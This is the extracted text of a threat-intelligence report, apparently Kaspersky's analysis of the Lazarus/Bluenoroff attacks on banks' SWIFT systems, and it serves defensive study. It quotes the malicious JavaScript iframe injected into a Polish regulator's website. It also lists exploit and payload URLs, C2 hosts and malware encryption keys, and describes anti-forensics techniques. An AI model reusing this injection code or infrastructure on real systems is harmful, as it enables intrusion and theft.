{
    "title": "Lazarus_Under_The_Hood_PDF_final",
    "text": "LAZARUS UNDER THE HOOD\nExecutive Summary  \nThe Lazarus Group’s activity spans multiple years, going back as far as 2009. Its malware has \nbeen found in many serious cyberattacks, such as the massive data leak and file wiper attack  \non Sony Pictures Entertainment in 2014 ; the cyberespionage campaign in South Korea , dubbed \nOperation Troy , in 2013 ; and Operation DarkSeoul , which attacked  South Korean media and \nfinancial companies  in 2013 . \n \nThere have been several attem pts to attribute one of the biggest cyberheist s, in Bangladesh in \n2016 , to Lazarus Group. Researchers discovered a similarity between the  backdoor used in \nBangladesh and code in one of the Lazarus wiper tools. This was the first attempt to link th e \nattack back to Lazarus. However, as new facts emerged  in the media , claiming  that there were \nat least three  independent attackers in Bangladesh , any certainty about  who exactly attacked \nthe banks  systems , and was behind one of the biggest ever bank heists in history , vanished. \nThe only thing that was certain was that Lazarus malware was used in Bangladesh . Howe ver, \nconsidering that we had previously found Lazarus in dozens of different countries, including \nmultiple infections in Bangladesh , this  was not very convincing  evidence and m any security \nresearchers expressed skepticism  abound th is attribution link.  \n \nThis paper is the result of forensic investigations by Kaspersky Lab at banks in two countries  far \napart . It reveals new modules used by Lazarus group and strongly links the tools used to attack \nsystems supporting  SWIFT to the Lazarus Group’s arsenal of lateral movement tools.  \n \nConsidering that Lazarus Group is still active in various cyberespionage and cybersabotage \nactivities , we have segregated  its subdivision focusing on attacks on banks and financial \nmanipulations into a separate group which we call  Bluenoroff (after one of the tools they used).  \nIntroduction  \nSince the beginning of 2016 , the cyberattack against the Bangladesh Central Bank, which  \nattempt ed to steal almost 1 billion USD , has been in the spotlight of all major news outlets.  \nNew, scattere d facts popped up as the investigation developed and new incidents were made  \npublic , such as claims  by the Vietnamese Tien Phon g bank about the prevention of the theft of 1 \nmillion USD in December 2015.  \n \nSecurity companies quickly picked up some patterns in the tools used in those attacks and \nlinked them to Lazarus Group.  \n \nThe Lazarus Group’s activity spans multiple years, going back as far as 2009. However, its \nactivity spike d from  2011. The group has deployed multiple malware families across  the years, \nincluding malware associated with Operation Troy and DarkSeoul, the Hangman malware (2014 -2015) and Wild Positron/Duuzer (2015). The group is known for spearphishing attacks, \nwhich include CVE -2015 -6585 , a zero­day vulnerability  at the time of its discovery.  \n \nThe last major set of publications on the Lazarus actor was made possible due to a security \nindustry alliance lead by Novetta . The respective research announcement was dubbed \nOperation Blo ckbuster .  \n \nThe following quote from Novetta's report , about the purpose of the research , caught our eye: \n\"While no effort can completely halt malicious operations, Novetta believes that these efforts \ncan help cause significant disruption and raise operating costs  for adversaries, in addition to \nprofiling groups that have relied on secrecy for much of their success. \" \nBluenoroff: a Child of Lazarus  \nClearly , even before the Operation Blockbuster announcement , Lazarus had an enormous \nbudget for its operation s and would need a lot of money to run its campaigns. Ironically, \nNovetta's initiative could have further increased the already rising  operating costs of Lazarus \nattacks, which in turn demanded better financing to continue its espionage and sabotage \noperations. So, one of the new objectives of Lazarus Group could be to become self -sustaining \nand to go after money. This is whe re Bluenoroff, a Lazarus unit, enters the s tory. Based on our \nanalysis, we believe this unit works within the larger Lazarus Group, reusing its backdoors and \nleveraging the access it created , while penetrating targets that have large financial streams. Of \ncourse it implies  a main focus on banks, but banks are not the only companies that are \nappearing  on the radar of Bluenoroff: financial companies, traders and casinos also fall within  \nBluenoroff ’s area of interest.  \n \nNovetta's report doesn't provide strict attribution, linki ng only to the FBI's investigation  of the \nSony Pictures Entertainment hack and a strong similarity in the malware tools. Some time later, \nthe media carried  additional facts about how strong the FBI's claims were, supporting this with \nsome data allegedly from the NSA . The deputy director of the NSA, Richard  Ledgett recently \ncommented  on Lazarus and its link to North Korea, however no new evidence of this link has \nbeen  provided.  \n \nSince the incident in Bangladesh, Kaspersky Lab has been tracking the actor going after \nsystems supporting SWIFT messaging, collecting information about its new attacks and \noperations. The recently discovered massive attack against banks in Europe in February 2017 \nwas also a result of this tracking. High ly importan t malicious activity was detected by Kaspersky \nLab products  in multiple European financial institutions in January 2017  and this  news  \neventually ended up being  publi shed  by the Polish media . The j ournalist s’ investigation s jumped \nslightly  ahead of technical investigations and disclosed some facts before the analysis was \nfinished. When it comes to Lazarus, the investigation and discovery of new facts is a long chain \nof events which consist of forensic and reverse engineering stages followin g one another . \nHence,  results cannot be made available immediately.  Previous Link to Lazarus Group \nSince the Bangladesh incident there have been  just a few articles explaining the connection \nbetween Lazarus Group and this particular heist . One was published  by BAE systems in May \n2016, however , it only included an analysis of the wiper code. This was followed by another \nblogpost by Anomali Labs confirming  the same wiping code similarity. This similarity was found \nto be satisfying to many readers, but we wanted to  look for a stronger connection.  \n \nOther claims that the attacker targeting  the financial sector in Poland was Lazarus Group came \nfrom Symantec  in 2017, which noticed string reuse in malware used at one of their Polish \ncustomers. Symantec also confirmed seeing the Lazarus wiper tool in Poland at one of their \ncustomers, however from this it's only clear that Lazarus might have attacked Polish bank s. \n \nWhile all these  facts look fascinating, the connection between Lazarus attacks on banks and its \nrole in attacks their back office operations  was still a loose  one. The only case where malware \ntargeting the  infrastructure used to connect to SWIFT was di scovered  is the Bangladesh Central \nBank incident . However,  while almost everybody in the security industry has heard about the \nattack , few  technical details based on the investigation that took place on site at the attacked \ncompany  have been revealed to the public . Considering that the post-hack stories in  the media \nmentioned  that the investigation stumbled upon three  different attackers , it was not obvious \nwhether Lazarus was the one responsible for the fraudulent SWIFT transactions , or if Lazarus \nhad in fact developed its own malware to attack the banks' systems .  \n \nIn addition, relying solely on a single si milarity based on file wiping code makes the connection \nnot as strong, because the secure file wiping procedure is a utility  function that can be used in \nmany non -malware related projects. Such code could  be circulating within certain software \ndeveloper communit ies in Asia. One such example is an open -source project called sderase  \navailable with sourcecode at SourceForge , submitted by a developer wi th an Asian looking \nnickname - zhaoliang86. We assumed that it's possible that there are many other projects like \nsderase available on Asian developer forums , and code like this could be borrowed from them.  \n \nWe would like to add a few  strong facts that lin k some attacks on banks to Lazarus , to share \nsome of our own findings and to shed light on the recent TTPs (Tactics, Techniques and \nProcedures) used by the attacker, including some as yet unpublished details from the attack in \nEurope in 2017.  \nIncident #1  \nThe incident happened in a South  East Asian country  in August 2016 , when Kaspersky Lab \nproducts detected new malicious activity from the  Trojan -Banker.Win32.Alreay malware family. \nThis malware was linked to the arsenal of tools used by the attackers in Bang ladesh. As the \nattacked organization was a bank, we decided to investigate this case in depth. During the \nmonths of cooperation with the bank that followed, we revealed more and more tools hidden deep inside its infrastructure. We also discovered that the attackers  had learned about our \nupcoming investigation and wip ed all the evidence they could, including tools, configuration files \nand log records. In their rush to disappear  they managed to forget some of the tools and \ncomponents , which remained in the sy stem . \nMalware Similarity  \nJust like other banks that have their own dedicated server  to connect to SWIFT , the bank in \nIncident #1 had its own. The server was running SWIFT Alliance software.  \n \nSince the notorious  Bangladesh cyberattack , the SWIFT  Alliance  software has been updated to \ninclude some additional checks which verify software and database integrity. This was an \nessential and logical measure as attackers had show n attempts to tamper with SWIFT software  \nAlliance  on disk and in memory, disabling dir ect database manipulations , as previously reported \nin the analysis  by BAE Systems. This was discovered by the attackers, who tracked the \nchanges in SWIFT Alliance software. The malware tools found in Incident #1 suggested that the \nattackers had carefully analyzed the patches and implemented a better way to patch new \nchanges. More details on the patcher tool are provided in the Appendix.  \n \nThe malware discovered on the server  conne cted to SWIFT strongly linked Incident #1 to the \nincident in Bangladesh. While certain tools were new and different in the malware code, the \nsimilarities left no doubt that the attacker in Incident #1 used the same code base. Below are \nsome of the identical code and encryption key patterns that we found.  \n \n  \nSample submitted from Bangladesh and \nmentioned in the BAE Systems blog . \nMD5: 1d0e79feb6d7ed23eb1bf7f257ce4fee  Sample discovered in Incident #1 to copy \nSWIFT message files to separate storage.  \nMD5:f5e0f57684e9da7ef96dd459b554fded  \n \nThe screenshot above shows the disassembly of the logging function implemented in the \nmalware. The code is almost identical. It was imp roved a little by adding current process ID to \nthe log record.  \n \nNever stopping code modification by the developer seems to be one of Lazarus Group’s  long-\nterm strategies: it keep s changing the code even if it doesn't introduce much new functionality. \nChanging the code break s Yara recognition and other signature -based detections. Another \nexample of changing code , while preserving the core idea , originates from Novetta's sample set.  \nOne of  the Lazarus malware modules that Novetta discovered used a binary configuration file \nthat was encrypted with RC4 and a hardcoded key.  \n \nA fragment of the code that loads, decrypts and verifies config file magic is shown below.  \n \n \nNote that the first DWORD of the decrypted data has to be 0xAABBCCDD. The new variants  of \nLazarus malware used since Novetta ’s publication included a different code, with a new magic \nnumber and RC4 key , but following the same idea.  \n \n \n \nSample submitted from Bangladesh. Uses \nmagic value 0xA0B0C0D0  \n \nMD5: 1d0e79feb6d7ed23eb1bf7f257ce4fee  Sample discovered in Incident #1. Uses magic \nvalue 0xA0B0C0D0  \n \nMD5: f5e0f57684e9da7ef96dd459b554fded  \nThe code above is used to read, decrypt and check the external config  file. You can see how it \nwas modified over time. The sample from Incident #1 has certain differences which would break \nregular binary pattern detection with Yara . However , it's clearly the same but improved code. \nInstead of reading the file once, malware attempts to read it up to five times with a delay of \n100ms. Then it decrypts the file with a hardcoded RC4 key, which is  an identical 16 bytes  in \nboth samples ( 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF ), and verifies the magic \nvalue which must be 0xA0B0C0D0 . \n \nAccording to forensic analysis , this malware was used by an actor who had remote access to \nthe system via its own custom set of backdoors. Most of the analyzed hosts were not directly \ncontrolled via a C2 server . Instead they connected  to another internal host that relayed TCP \nconnection to the C2 using a tool that we dubbed the TCP Tunnel Tool. This tool can be used to \nchain internal hosts within the  organization and relay connection to the real C2 server. This \nmakes it harder for admi nistrators to identify compromised hosts, because local connections \nusually seem  less suspici ous. One very similar tool was also described by Novetta, which it \ndubbed Proxy PapaAlfa . This tool is one of the most popular during an attack. Some hosts were \nused only as a relay, with no additional malware installed on them. That's why we believe that  \nthe Lazarus actor has many variants of this tool and changes it often to scrutinize network or \nfile-based detection. For full the technical details of the tool discovered in Incident #1 see \nAppendix (MD5: e62a52073fd7bfd251efca9906580839).  \n \nOne of the central hosts in the bank, which was running SWI FT Alliance software , contained a \nfully-fledged backdoor (MD5: 2ef2703cfc9f6858ad9527588198b1b6) which has  the same  strong \ncode and protocol design as a family of backdoors dubbed Romeo by Novetta . The same , but \npacked , backdoor was uploaded to a multiscanner service from Poland and South Korea in \nNovember 2016 (MD5:  06cd99f0f9f152655469156059a8ea25). We believe that this was a \nprecursor of upcoming attacks on Poland and other European countries, however this was not \nreported publicly in 2016. The same malware was delivered to the European banks via an \nexploit attack in January 2017.  \n \nThere are many other visible similarities between the Lazarus malware reported by Novetta and \nmalware discovered in Incident #1, such as  an API import procedure and a complicated custom \nPE loader. The PE loader was used by many malware co mponents: DLL loaders, injectors,  and \nbackdoors.  \n   \nLimaAlfa sample from Novetta's Lazarus \nmalware set (loader of other malicious files).  \n \nMD5: b135a56b0486eb4c85e304e636996ba1  Sample discovered in Incident #1 (backdoor \nwhich contains PE loader code).  \n \nMD5: bbd703f0d6b1cad4ff8f3d2ee3cc073c  \n \nNote that the modules presented differ in file type and purpose: Novetta's sample is an EXE file \nwhich is used to load other malicious PE files , while the sample discovered in Incident #1 is a \nDLL backdoor. Still , they are based on an identical code base.  \n \nThe discussion about  similarities can be continued . However , it's now very clear that the attack \nin Bangladesh and Incident #1 are linked through the use of the Lazarus malware arsenal.  \n \nForensic Findings on the Server  Connected to SWIFT  \nIn the case of the South East Asian attack we have seen infections both on the server  \nconnecting to SWIFT  and several systems that belong to the IT department of the company. We \nmanaged to recover most of the modules, while some o thers were securely wiped and became \ninaccessible for analysis. Nevertheless , in many cases we see references to unique filenames \nthat were also seen on other infected systems and were most likely malicious tools. As we \nlearned from the analysis of this in cident, there are cross -victim event correlations, which \nsuggest that attackers worked in multiple compromised banks at the same time.  \nHere are our key takeaways from the forensic analysis:  \n● The attackers had a foothold in the company for over seven  months.  The South East \nAsian bank was breached at the time when the Bangladesh heist happened.  \n● Most of the malware was placed into a C:\\Windows directory or C: \\MSO10 directory. \nThese two paths were hardcoded into several modules.  \n● The malware was compiled days or sometimes hours before it was deployed , which \nsuggests a very targeted and surgical operation.  \n● The attackers used an innocent looking decryptor with a custom PE loader designed to \nbypass detections by security products on start.  \n● Most of the modules are des igned to run as a service or have administrative/SYSTEM \nrights.  \n● The backdoors found in this attack  on the server connecting to SWIFT  matched the \ndesign described by Novetta as a Romeo family of backdoors (RATs) in their paper, \nwhich directly links the South East Asian case to Lazarus.  \n● Not everything ran smoothly for the attacker. We found multiple events of process \ncrashes and system restarts during the time of the alleged attacker ’s presence.  \n● Attackers operated out of office hours according to the victim's schedule and timezone to \navoid detection.  \n● They attempted to debug some problem s by enabling the sysmon driver for several \nhours. Later , they forgot to wipe the sysmon event log file , which contained information \non running processes, their respective c ommandlines and file hashes.  \n● There was specific malware targetting SWIFT Alliance software that disabled internal \nintegrity checks and intercepted processed  transaction files. We called this ‘SWIFT \ntargeted  malware ’ and directly attribute authorship to the  Bluenoroff unit of Lazarus.  \n● The SWIFT malware is different from other Lazarus tools, because it lacks obfuscation, \ndisguise and packing.  \n● Persistence was implemented as Windows service DLL, registered inside the group of \nNetwork Services (netsvcs).  \n● They us ed a keylogger, which was stored in an encrypted container . This  was decrypted \nand loaded by a loader that fetched the encrypted information  from a different machine \n(disguised as one of the files in C:\\Windows \\Web \\Wallpaper \\Windows \\). \n● The attackers pa tched SWIFT  Alliance  software modules on disk perma nently, but later \nrolled back the changes. Another operational failure was forgetting to restore the \npatched module in the backup folder. The p atch applied to the liboradb.dll module is very \nsimilar to the one described  by BAE Systems in its article about the Bangladesh attacks.  \n● Attackers used both passive and active b ackdoors. The passive backdoors listened on  \nthe TCP port which was opened in Firewall via a standard netsh.exe command. That left \nadditional records in system event log files. The port was set in the config , or passed as  \na command -line argument. They prefe r ports ending with 443, i.e. 6443, 8443, 443 . \n● Internal SWIFT  Alliance  software logs contained several alerts about  database failures \nfrom June to August 2016, which links to attackers ’ attempts to tamper with the database \nof transactions.  \n● The attackers di dn't have visual control of the desktop through their backdoors which is \nwhy they relied on their own TCP tunnel tools that forwarded RDP port s to the operator. \nAs a result we identified the anomalous activity of Terminal Services: they worked late \nand som etimes during weekends.  \n● One of the earliest Terminal Services sessions was initiated from the webserver hosting  \nthe company's public website. The webserver was in the same network segment as the \nserver  connected to SWIFT  and was most likely  the patient zero in this attack.  \n  Timeline of Attacks  \nDue to long -term cooperation with the bank we had the chance to inspect several compromised \nhosts in the bank. Starting with analysis of the central host , which was the server  connecting to \nSWIFT;  we could see connections to other hosts in the network. We suspected them to be \ninfected and this was confirmed during a closer look.  \n \nOnce the contact between that bank and Kaspersky Lab was established, the attackers \nsomehow realized that the behavior  of system administrators was not normal and soon after \nthat they started wiping all traces of their activity. Revealing traces of their presence took us a \ncouple of months, but we managed to collect and build a rough timeline of some of their \noperations, which again provided us with activity time information.  \n \nWe have collected all timestamps that indicate  the activity of the attacker s and put  them  in one \ntable, which has helped us to build a timeline of events base d on the remain ing artefacts.  \n \n \nFig. Timeline of events in related to Incident #1.  \n \nSynchronicity of Events in Different Incidents  \nDuring the analysis of event log files we found one coming from Sysinternals Sysmon. \nSurprisingly , the event log file contained records of malware activity from months before the \nforensic analysis, logging some of the intruders’ active work.  \n \nWhen we discovered that strange sysmon log we were confused, as it seemed like the attacker \nenabled it , or someone who wanted to monitor the attacker did. Later on, a securit y researcher \nfamiliar with the Bangladesh investigation results confirmed that similar sysmon activity was \nalso registered on 29 January 2016. This means that it happened to at least two different victims \nwithin  minutes.  \n \nAnother event was related to tampe ring with SWIFT database modules.  \n \nDuring the analysis of systems in Incident #1, we found a directory \nC:\\Users \\%username% \\Desktop \\win32 \\ which was created at 2016 -02-05 03:22:51 (UTC). \nThe directory contained a patched liboradb.dll file which was modifie d at 2016 -02-04 14:07:07 \n(UTC) , while the original unpatched file seems to be created on 2015 -10-13 12:34:26 (UTC) and \nstored in liboradb.dll.bak. This suggests attacker activity around 2016 -02-04 14:07:07 (UTC) . \nThis was the date of the widely publicized Bangladesh cyber  heist.  \n \nThis finding corresponds to already known incident at Bangladesh Central Bank in February \n2016. According to BAE , in BCB the module “liboradb.dll” was also patched with the same “NOP \nNOP” technique.  \n \n \nFig. Patched module in Bangladesh case (courtesy of BAE Systems).  \n \nSo far, this means that the attackers' activity and the file modification occurred on the same day \nin two banks in two different countries on 29 January , 2016 and 4 February , 2016 .  \n \nTo conclude, Bangladesh Central Bank was probably one of many banks compromised for th e \nmassive operation involving hundreds of millions of dollars. A bank in South East Asia linked to \nIncident #1 is live confirmation of this fact.  \nAnti-Forensics Techniques  \nSome of the techniques used by the attackers were quite new and interesting. We assu me that \nthe attackers knew about the constraints implied by the responsibility of SWIFT and the bank \nwhen it comes to investigatin g a cyberattack. So far, all infected assets were chosen to be \ndistributed between SWIFT  connected systems  and the bank ’s own systems. By splitting the \nmalicious payload into two pieces and placing them in two different zones of responsibility , the \nattackers attempted to achieve zero visibility from any of the parties that would investigate or \nanalyze suspicious files on its side . We believe that involving a third -party like Kaspersky Lab  \nmakes a big change to the whole investigation .  \n \nTechnically it was implemented through  a simple separation of files, which had to be put \ntogether to form  a fully functioning malicious process. We have seen this approach at least \ntwice in current forensic analysis and we strongly believe that it is not a coincidence.  \n \nMalware Component 1  Malware Component 2  Description  \nTrojan Dropper, \nigfxpers.exe was found \non HostC  Dropped Backdoor, was \nfound on HostD  The backdoor was dropped on the \ndisk by the Dropper , if the operator \nstarted it with valid secret password , \nprovided via commandline.  \nDLL Injector, esserv.exe \nwas found on HostD  Keylogger, loaded by DLL \nInjector was found on \nHostA  The Keylogger was stored in \nencrypted container and could only be \nloaded with the DLL Injector from \nanother host.  \n \nIt's common for forensic procedure s to be  applied to a system as a whole. With standard \nforensic procedure s, which include the analysis of a memory dump and disk image of a \ncompromised system , it is uncommon to look at a given computer as a half -compromised \nsystem, meaning that the other ingredient  which makes it compromised live s elsewhere. \nHowever, in reality the system remains breached. It implies that a forensic analyst focusing on \nthe analysis of an isolated single system may not see the full picture. That is why we believe \nthat this technique was used as an attempt to prevent successful forensic analysis. With this in \nmind , we'd like to encourage all forensics analyst s to literally look outside of the box when \nconducting breach analysis, especially when you have to deal with Lazarus.  \nPassword Protected Malware  \nAnother interesting technique is in the use of password -protected malware. While this technique \nisn't exactly new, it is usually a signature of advanced attackers. One such malware that comes \nto mind is the mysterious Gauss  malware, which require s a secret ingredient to decrypt its \nprotected payload. We published our research about Gauss malware in 2012 and since then \nmany attempts have been  made to crack the Gauss encryption passphrase , without any \nsuccess.  \n \nThe idea is quite a simple yet very effective anti -forensics measure: the malware dropper \n(installer) uses a secret passphrase passed via command line argument. The argument is \nhashed with MD5 and is used as the key to decrypt the payload. In the context of the Incident \n#1 attack, the payload was , in turn , a loader of the next stage payload , which was encrypted \nand embedded into the loader. The loader didn't have the key to decrypt its own embedded \npayload, but it looked for the decryption key in the registry value. That registry value should \nhave to be  set by the installer , otherwise the malware doesn't work. So, clearly , unless you have the secret passphrase , you cannot reconstruct  the full chain of events. In the case of Incident #1 \nwe managed to get the passphrase and it was a carefully selected string consisting of 24 \nrandom alpha -numeric upper and lowercase characters.  \n \nAbout The Infection Vector  \nDue to the age of the breach ins ide the bank , little has been preserved and it's not very clear \nhow the attackers initially breached the bank. However, what becomes apparent is that they \nused a web server located in the bank to connect via Terminal Services  to the one linking to \nSWIFT co nnected systems . In some cases they would switch from the web server to another \ninternal infected host that would work as a relay . However , all the hosts that we analyzed had \nno interaction with the external world except for the web server  mentioned , which hosted the \ncompany's website and was exposed to the world.  \n \nThe web server installation was quite fresh : it had hosted the c ompany's new website , which \nwas migrated from a previous server , for just a few months before it was compromised. The \nbank co ntracted a pentesting company to do a security assessment of the new website which \nwas ongoing when Lazarus breached the server. The infection on the web server appeared in \nthe middle of pentesting probes. Some of these probes were successful and the pente ster \nuploaded a C99 -like webshell to the server as a proof of breach. Then the pentester continued \nprobing other vulnerable scripts on the server, which is why we believe that the intention was \nbenign. In the end, all scripts discovered by the pentester we re reported and patched.  \n \nConsidering that there were known breaches on the webserver, which were identified and \npatched with the help of an external security audit, there is a high probability that the server was \nfound and breached by the Lazarus actor before the audit. Another possibility is that the C99 -\nshell uploaded by the pentester was backdoored and beaconed back to the Lazarus Group, \nwhich immediately took over the server. Unfortunately , the C99 -shell was identified only by the \nquery string, the bod y of the webshell was not recovered.  \n \nOne way or another, the breach of the web server seems to be the most probable infection \nvector used by Lazarus to enter the bank ’s network.  \n \nIncident #2  \nOur investigation in Europe started with very similar symptoms to those which we have \npreviously seen in South  East Asia in Incident #1. In January 2017 we received information \nabout new detections of the Blue noroff malware we have been tracking. One of the alarming \ntriggers was the sudden deployment of freshly built s amples, which indicated that a new serious \noperation had begun.  \n After establishing  a secure communication with some of the targets , we passed some indicators \nof compromise and quickly got some feedback confirming the hits.  \n \nThanks to the support and cooperation of a number of partners, we managed to analyse \nmultiple harddrive disk images that were made soon after taking the identified compromised \nsystems  offline . \n \nAnalysis of the disk images revealed the presence of multiple malware tools associated with the \nBluenoroff unit of the Lazarus  Group. Analysis of the event logs indicate that several hosts were \ninfected and other hosts had been targeted by the attackers for lateral movement operations. \nAttackers attempted to access the domain cont roller and mail server inside the companies, \nwhich is why we recommend that future investigators should  avoid using corporate email for \ncommunicatin g with victims of  Lazarus Group. \n \nIn one case, the initial attack leveraged an old vulnerability in Adobe Fl ash Player, which was \npatched by Adobe in April 2016. Although an updater was installed on this machine, it failed to \nupdate Adobe Flash Player, probably due to network connectivity issues.  \n \nInitial Infection.  \nIn one of the incidents, we discovered that patient zero visited a compromised government \nwebsite using Microsoft Internet Explorer on 10 January, 2017.  \n \nInfected webpage URL: https://www.knf.gov[.]pl/opracowania/sektor_bankowy/index.html  \n \nThe time of the visit is confirmed by an Internet Explorer cache file , which contains an html page \nbody from this host.  \n \nThe webpage loaded a Javascript resource from the same webserver referenced from the page:  \n<script type=\"text/javascript\" src=\" /DefaultDesign/Layouts/KNF2013/resources/accordian -\nsrc.js?ver=11 \"></script>  \n \n \nThe i nformation provided below appeared in the public domain . \n \nPreliminary investigation  suggests that the starting point for the infection could have been located on \nthe webserver of a Polish financial sector regulatory body, Polish Financial Supervision Authority \n(www.knf.gov[.]pl). Due to a slight modification of one of the local JS files, an external JS file was loaded, \nwhich could have executed malicious payloads on selected targets . \n  \nNote: image is a courtesy of badcyber.com  \n \nThe unauthorised code was located in the followin g file:  \nhttp://www.knf.gov[.]pl/DefaultDesign/Layouts/KNF2013/r esources/accordian -src.js?ver=11  \nand looked like this: \ndocument.write(\"<div id='efHpTk' width='0px' height='0px'><iframe name='forma' \nsrc=' https://sap.misapor[.]ch/vishop/view.jsp?pagenum=1 ' width='145px' height='146px' style='left: -\n2144px;position:absolute;top  \n:0px;'></iframe></div>\");  \n \nAfter successful exploitation , malware was downloaded to the workstation, where, once executed, it \nconnected to some foreign servers and could be used to perform network reconnaissance, lateral \nmovement and data exfiltration . \nVisiting the exploit page resulted in Microsoft Internet Explorer  crashing , which was recorded \nwith a process dump file. The dumped process included the following indicators:  \n \n[version=\"2\"]  \n[swfURL=\" https://sap.misapor[.]ch/vishop/include/cambio.swf \" \npageURL=\" https://sap.misapor[.]ch/vishop/view.jsp \"]... \nAdditional research by Kaspersky Lab discovered that the exploit file at \nhxxp://sap.misapor[.]ch:443/vishop/include/cambio.swf  resulted in the downl oad of a \nbackdoor module.  \nBased on our own telemetry, Kaspersky Lab confirms that sap.misapor[.]ch was compromised \nas well , and was spreading exploits for Adobe Flash Player and Microsoft Silverlight. Some of \nthe known vulnerability CVEs observed in attack s originat e from that website:  \n1. CVE-2016 -4117  \n2. CVE-2015 -8651  \n3. CVE-2016 -1019  \n4. CVE-2016 -0034  \n \nThe Flash exploit used in the attacks was very similar to known exploit s from the Magnitude \nExploit Kit. These vulnerabilities have been  patched by Adobe and Microsoft since April 2016 \nand January 2016 respectively.  \n \n \n \nFig. Part of the exploit code  \n \nInside the exploits, one can see a lot of Russian word strings, like “chainik”, “BabaLena”, \n“vyzov_chainika”, “podgotovkaskotiny”, etc. The shellcode downloads the final pay load from:  \nhttps://sap[.]misapor.ch/vishop/view.jsp?uid=[redacted]&pagenum=3&eid=00000002&s=2\n&data=  \n \n \nIt's worth mention ing here that Lazarus used other false flags in conjunction with this Russian \nexploit code. They also used some Russian words in one of the backdoor s and packed the \nmalware with a commercial protector (Enigma) developed by a Russian author. However, the \nRussi an word s in the backdoor looked like a very cheap imitation, because every native \nRussian speaking software developer quickly notice d how odd these  commands were . \n \nFig. Russian words in the backdoor code.  \nAt the time of research this URL was dead but we w ere able to find an identical one which leads \nto a malicious file  download  (MD5: 06cd99f0f9f152655469156059a8ea25 , detected as Trojan -\nBanker.Win32.Alreay.gen) from http://www.eye -watch[.]in/design/img/perfmon.dat.   \nInterestingly, this sample was uploaded t o VirusTotal from Poland and Korea in November \n2016. It is a packed version of a previously known backdoor used by Lazarus attackers in \nIncident #1 ’s bank.  \nWhat Made the Breach Possible  \n \nSince the attackers didn’t use any zero -days, the infiltration was s uccessful because of non -\nupdated software. In one case, we observed a victim running the following software:  \n \nThe exploit breached the system running Adobe Flash Player, version 20.0.0.235 . This version \nwas officially released on 8 December , 2015 . \n \nAdobe implemented a self -update mechanism for Flash Player some years ago and the \nanalyzed system indeed had a scheduled job, which attempted to periodically update Adobe \nFlash Updater. We checked the event logs of the Task Scheduler and this task was regularly \nrunning.  \n \nThe task was started as SYSTEM user and attempted to connect to the Internet to fetch Flash \nPlayer updates from  fpdownload.macromedia.com . However, this attempt failed , either \nbecause it couldn't find the proxy server to connect to the update ser ver, or because of missing \ncredentials for the proxy. The last failed attempt to update Adobe Flash was dated in December \n2016, a month before the breach happened. If only that updater could have accessed the \nInternet the attack would have failed. This is an important issue that may be widely present in \nmany corporate networks.  \nLateral Movement. Backup Server.  \nAfter the initial breach the attackers pivoted from infected host s and emerged to migrate to a \nsafer place for persistence. A backup server was chosen as the next target.  \n \nBased on traffic logs provided for our analysis , we confirmed that there were connections to \nknown Bluenoroff C2 servers originating from infected  hosts. The following information was \nfound in the network logs:   \n \nDestination:Port  Type  Bytes Transfered  \n82.144.131[.]5:8080  Incomplete  Less than 1KB  \n82.144.131[.]5:443  SSL Less than 3KB  \nBy checking other non -whitelisted hosts and IP ranges we were able to identify an additional C2 \nserver belonging to the same attackers:  \n \nDestination:Port  Type  Bytes Transfered  \n73.245.147[.]162:443  SSL Less than 1.5MB  \nWhile this additional C2 hasn't been reported previously, there were no additional hosts found \nthat connected to that server.  \nLateral Movement. Host1.  \nDuring the attack, the threat actor deployed a number of other malware to a second machine we \ncall Host1. The malware files include:  \n \nFilename  Size MD5  \n%SYSTEM% \\msv2_0.dll  78'848 bytes  474f08fb4a0b8c9e1b88349098de10b1  \n%WINDIR% \\Help \\msv2_0.chm  729'088 bytes  579e45a09dc2370c71515bd0870b2078  \n%WINDIR% \\Help \\msv2_0.hlp  3'696 bytes  7413f08e12f7a4b48342a4b530c8b785  \n \nThe msv2_0.dll  decrypts and loads the payload from msv2_0.chm , which , in turn , decrypts and \nloads a configuration file from msv2_0.hlp . msv2_0.hlp , which is encrypted with Spritz \nencryption algorithm and the following key: 6B EA F5 11 DF 18 6D 74 AF F2 D9 30 8D 17 72 \nE4 BD A1 45 2D 3F 91 EB DE DC F6 FA 4C 9E 3A 8F 98  Full technical details about this malware are available in the Appendix.  \n \nThe decrypted configuration file contains references to two previously known1 Bluenoroff C2 \nservers:  \n● tradeboard.mefound[.]com:443  \n● movis-es.ignorelist[.]com:443  \n \nAnother file created around the same time was found in :  \n● C:\\Windows \\Temp \\tmp3363.tmp . \n \nIt included a short text file which contain ed the following text message:  \n \n[SC] StartService FAILED 1053:  \n \nThe service did not respond to the  start or control request in a timely fashion.  \n \nAdditional search es by events which occurred around the same time brought some evidence of \nother command line executable modules and Windows system tools being run on that day and \nlater. The following Prefetch files indicate  the execution of other modules:  \n \nExecutable  Run Counter  \nRUNDLL32.EXE  1 \nRUNDLL32.EXE2 1 \nFIND.EXE  6 \nGPSVC.EXE  11 \nSC.EXE  11 \nNET.EXE  42 \nNETSTAT.EXE  8 \nMSDTC.EXE  7 \n \nThis confirms  the active reconnaissance stage of the attack.  \n \nAccording to prefetch files for RUNDLL32.EXE, this executable was used to load msv2_0.dll  \nand msv2_0.chm . References to these  files were found in the prefetch data of this process.  \n \n                                                \n1 Bluenoroff is a Kaspersky  Lab codename for a threat actor involved in financial targeted attacks. The \nmost well-known attack launched by the Blue noroff group is the Bangladesh bank heist.  \n2 Same executable was run with different command line  Note: MSDTC.EXE and GPSVC.EXE are among the commonly used filenames of these \nattackers in the past. While these  filenames may look legitimate, their location was different \nfrom the standard system equivalents.  \n \nStandard Windows msdtc.exe binary is usually located in \n%systemroot% \\System32 \\msdtc.exe , while the attacker placed msdtc.exe in \n%systemroot% \\msdtc.exe  for disguise. The path was confirmed from parsed prefetch files. \nUnfortunately the attackers have already securely wiped the msdtc.exe file in the Windows \ndirectory. We were unable to recover th is file.  \n \nThe same applies to %systemroot% \\gpvc.exe  which existed on the dates of the attack but was \nsecurely wiped by the attackers later.  \n \nBased on the timestamps we found so far, it seems that the initial infection of Host1 occurred \nthrough access from a privileged account. We looked carefully at  the events preceding the \ninfection time and found something suspicious in the Windows Security event log:  \n \nDescription  Special privileges assigned to new logon.  \nSubject:  \nSecurity ID: [REDACTED]  \nAccount Name: [ADMIN ACCOUNT REDACTED]  \nAccount Domain: [REDACTED]  \nLogon ID: [REDACTED]  \nPrivileges: SeSecurityPrivilege                 SeBackupPrivilege                   \n SeRestorePrivilege            \n     SeTakeOwnershipPrivilege                     SeDebugPrivilege                    \n SeSystemEnvironmentPrivilege                 SeLoadDriverPrivilege               \n SeImpersonatePrivilege   \n 